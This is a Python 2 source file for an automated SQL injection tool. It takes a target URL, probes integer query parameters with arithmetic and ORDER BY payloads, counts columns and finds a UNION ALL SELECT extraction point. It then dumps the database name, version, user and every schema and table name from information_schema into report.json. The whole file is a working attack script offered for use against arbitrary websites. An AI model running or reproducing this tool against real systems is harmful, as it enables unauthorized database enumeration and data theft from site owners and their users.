import urllib2
from urlparse import urlparse
from difflib import Differ
from difflib import SequenceMatcher
import random
import string
import json




class target(object):
    """Target class for mainting the url and paraments."""
    weburl = ""
    paramenters = []
    info = []
    injection_payload = ""
    injection_query = ""


    def __init__(self,u,p):
        self.weburl = u
        self.paramenters = p
        pass
    def set_inj_payload(self,payload):
        self.injection_payload = payload
        pass
    def set_inj_query(self,query):
        self.injection_query = query
        pass
    def generate_injection_url(self,id,val):        
        que = ""
        for x in xrange(0,len(self.paramenters)):
            if x == id:
                que += self.paramenters[x].param_name + "=" + urllib2.quote(val)
                pass
            else:
                que += self.paramenters[x].param_name + "=" + self.paramenters[x].param_val
                pass
            if x != len(self.paramenters):
                que += "&"
                pass
            pass
        return self.weburl + "?" + que
        pass


class QueryParms(object):
    """QueryParms is created to handle the Query elements in the web request easilly and identity the paramenters based on assumptions."""
    param_name = ""
    param_val = ""
    param_type = ""
    def __init__(self ,P_name, p_value):
        self.param_name = P_name
        self.param_val = p_value
        if self.RepresentsInt(self.param_val):
            self.param_type = "integer"
            pass
        else:
            self.param_type = "string"
        pass
    def RepresentsInt(self,s):
        try: 
            int(s)
            return True
        except ValueError:
            return False
        pass
    def getQuery(self):
        return self.param_name + "=" + self.param_val

    def getQueryVal(self,val):
        return self.param_name + "=" + val

def finddiff(s1, s2):
    "Adds <b></b> tags to words that are changed"
    l1 = s1.split(' ')
    l2 = s2.split(' ')
    dif = list(Differ().compare(l1, l2))
    return " ".join(['<DIFF>'+i[2:]+'</DIFF>' if i[:1] == '+' else i[2:] for i in dif 
                                                           if not i[:1] in '-?'])


def check_url(u):
    print 'checking the url is valid ...!'
    ur = urlparse(u)
    if len(ur.scheme) > 0:
        print 'yup its the correct url...!'
        return True;
        pass
    pass


def is_valid_url():
    return url

def send_get(url):
    return urllib2.urlopen(url).read();


query_parameters = []
target_url = ""

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def int_split_check_payload(i):
    i1 = random.randint(i^5,i^10)
    i3 = i1 + i
    return str(i3) + "-" + str(i1)
    pass
def similar(a, b):
    return SequenceMatcher(None, a, b).ratio()

def error_chunk(size=20, chars=string.ascii_uppercase + string.digits + '@&^()\"\''):
    return ''.join(random.choice(chars) for _ in range(size))

def generate_union_string(nu,table="",where=""):

    st = " UNION ALL SELECT " + ",".join(nu)
    st += (" FROM " + table) if (len(table)>0) else ""
    st += (" WHERE " + where) if (len(where)>0) else ""
    return st

def retriver_injection(retrivers,inj):
    retriver_inj = "CONCAT(0x"+retrivers[0].encode("hex") + ","+inj+",0x"+retrivers[1].encode("hex")+")"
    return retriver_inj
    pass



def union_extract(cols,tar,inj,xa,param_id,use_escape=False,table="",where=""):
    nulls = []
    for x in xrange(0,cols):
        nulls.append("null")
        pass
    
    retrivertags = ["<"+error_chunk(8,string.ascii_letters)+">","<"+error_chunk(8,string.ascii_letters)+">"]
   
    retriver_inj = retriver_injection(retrivertags,inj)
    nulls[xa] = retriver_inj
    union_injection_string = generate_union_string(nulls,table,where)
    union_injection_string += "#" if use_escape else ""
    u = tar.generate_injection_url(param_id,"null "+union_injection_string)
    r1 = send_get(u)
    ret = find_between(r1,retrivertags[0],retrivertags[1])
    return ret
    pass
def union_injection_test(cols,tar,normal_data,error_data,param_id,use_escape=False):
    nu = []
    nu2 = []
    for x in xrange(0,cols):
        col = error_chunk(10,string.ascii_uppercase)
        nu.append(col)
        nu2.append("0x"+col.encode("hex"))
        pass
    union_injection_string = generate_union_string(nu2)
    union_injection_string += "#" if use_escape else ""
    u = tar.generate_injection_url(param_id,"null "+union_injection_string)
    r1 = send_get(u)
    print '\n\nFinding the Extraction Point...!\n\n'
    extration_points = []


    for x in xrange(0,len(nu)):
        if r1.find(nu[x]) != -1:
            extration_points.append([x,nu[x]])
            pass
        pass
    print str(len(extration_points)) + " Extractions points found...!"
    print extration_points
    for x in xrange(0,len(extration_points)):
        main_point = extration_points[x]
        test_subject = error_chunk(200,string.ascii_lowercase)
        ret = union_extract(cols,tar,"0x"+test_subject.encode("hex"),main_point[0],param_id)
        if ret == test_subject:
            print 'Data Extraction is Possible....!'
            extration_possible = True
            return main_point
            pass
        pass
    pass

def col_count_enum_1(tar,normal_data,error_data,param_id,use_escape=False):
    "Testing the col count using order by clause.."

    reached_end = False
    col = 0
    for x in xrange(1,50):
        order_by_injection_string = " order by "+str(x)
        order_by_injection_string += "#" if use_escape else ""
        u = tar.generate_injection_url(param_id,int_split_check_payload(int(query_parameters[param_id].param_val))+order_by_injection_string)
        r1 = send_get(u)
        #print r1
        if similar(r1,normal_data) > 0.9:
            reached_end = False
            pass
        else:
            reached_end = True
            col = x-1
            break
            pass

        pass
    print 'Coloums Founds ' + str(col)
    return col
    pass

extration_possible = False

def phase_1(tar):
    t = tar
    normal_data = send_get(t.generate_injection_url(-1,-1))
    error_data = send_get(t.generate_injection_url(0,error_chunk()+error_chunk(9,"\"\'@!%^&*()")))

    print finddiff(normal_data,error_data)
    print similar(normal_data,error_data)
    web_title = find_between(normal_data,"<title>","</title>")

    print '\n\nWebsite Title : '+web_title.strip()
    for x in xrange(0,len(query_parameters)):
        if query_parameters[x].param_type == "integer":
            print 'Testing Integer injection on paramenter ' + query_parameters[x].param_name
            
            test1 = False
            r1 = send_get(t.generate_injection_url(x,int_split_check_payload(int(query_parameters[x].param_val))))
            if similar(normal_data,r1) > 0.9:
                print 'first test passed...!\n\nThe Application is processing the integer values'
                test1 = True
                pass
            else:
                print 'seems like the server is not processing the arthimetics.... :('
                pass
            
            test2 = False
            r1 = send_get(t.generate_injection_url(x,"("+int_split_check_payload(int(query_parameters[x].param_val))+")"))
            if similar(normal_data,r1) > 0.9:
                print 'Second test passed...!\n\nThe Application is processing the integer values with parenthies'
                test2 = True
                pass
            else:
                print 'seems like the server is not processing the parenthies.... :('
                pass
            pass
            
            test3 = False
            r1 = send_get(t.generate_injection_url(x,query_parameters[x].param_val+" order by 2"))
            
            if similar(normal_data,r1) > 0.9:
                print 'third test passed...!\n\nThe order by injection is working...!'
                test3 = True
                pass
            else:
                print 'Nope Order by claus are not working...!'
                pass
            pass

            test4 = False
            r1 = send_get(t.generate_injection_url(x,int_split_check_payload(int(query_parameters[x].param_val))+" order by 1 #"))
            if similar(normal_data,r1) > 0.9:
                print 'fourth test passed...!\n\n Order By Injection with Escape charaters are working'
                test4 = True
                pass
            else:
                print 'Nope Order by clause with escape are not working...!'
                pass
            pass
            print 'now Finding the colums....!\n\n'
            cols = col_count_enum_1(t,normal_data,error_data,x,True)
            main_point = union_injection_test(cols,t,normal_data,error_data,x,True)

            print ' Enumrating the Database'
            
            if len(main_point) > 0:
                report = {}

                report['current_database'] = union_extract(cols,t,"database()",main_point[0],x)
                report['version'] = union_extract(cols,t,"@@version",main_point[0],x)
                report['user'] = union_extract(cols,t,"user()",main_point[0],x)
                databases =union_extract(cols,t,"group_concat(schema_name)",main_point[0],x,True,"information_schema.schemata")
                report['databases'] = databases = databases.split(",")

                print str(len(databases)) + "Databases found"
                report['DatabasesAndTables'] = {}
                for db_id in xrange(0,len(databases)):
                    print databases[db_id] + " : Tables"
                    report['DatabasesAndTables'][databases[db_id]] = {}
                    tables = union_extract(cols,t,"group_concat(table_name)",main_point[0],x,True,"information_schema.tables","table_schema=0x"+databases[db_id].encode("hex"))
                    tables = tables.split(",")    
                    report['DatabasesAndTables'][databases[db_id]] = tables
                    for tb_id in xrange(0,len(tables)):
                        print '\t--> '+tables[tb_id]
                        
                        pass
                    pass
                with open('report.json', 'w') as f:
                    json.dump(report, f)

                print 'the report has been saved in report.json in JSON format.'
                pass
        pass


    pass

def main():
    print 'welcome to PySql Injection s tool'
    print 'Please enter thtae target url'
    u = raw_input("Enter the Web url : ")
    if check_url(u):
        print 'proceding to the Scan.'
        url_o = urlparse(u)
        target_url = url_o.scheme +'://'+ url_o.netloc + url_o.path
        parts = url_o.query.split("&")
        for x in xrange(0,len(parts)):
            paramenter = parts[x].split("=")
            ik = QueryParms(paramenter[0],paramenter[1])
            print ik.param_type + " : " + ik.param_name
            print ik.getQuery() 
            print ik.getQueryVal("this")
            query_parameters.append(ik)
            pass
        pass

        print '\n\n\nTotal ' + str(len(query_parameters)) + ' Query paramenters received'
        print 'Phase 1 starting : testing and target\n\n'
        print 'target : ' + target_url
        print 'query  : ' + url_o.query

        tar = target(target_url,query_parameters)
        phase_1(tar)
    else:
        print 'please enter the correct url'

if __name__ == "__main__": main()
